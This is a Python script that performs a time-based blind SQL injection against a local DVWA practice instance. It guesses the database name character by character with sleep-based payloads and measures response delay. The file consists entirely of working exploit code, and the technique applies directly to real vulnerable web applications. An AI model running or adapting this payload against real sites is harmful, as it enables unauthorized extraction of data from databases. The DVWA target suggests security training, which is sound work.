#!/usr/bin/python3

import requests, string, time

# global variables
chars = string.ascii_lowercase
url="http://localhost/dvwa/vulnerabilities/sqli_blind/?id="
result = ''
cookie = {
	"PHPSESSID":"pajtiipam9n1a9crh5s36ptimp",
	"security":"low"
}

def checker(payload):
	time_start = time.time()
	request = url+payload
	content = requests.get(request, cookies = cookie)
	time_end = time.time()

	if time_end - time_start > 5:
		return 1


for i in range(0,10):
	for char in chars:
		payload = "1'+and+if(substr(database(),%d,1)='%c',sleep(5),1)--+-&Submit=Submit#" %(i,char)
		if checker(payload):
			result += char
			print("[*] %s" % result)
			break

print("\n[+] %s" % result)


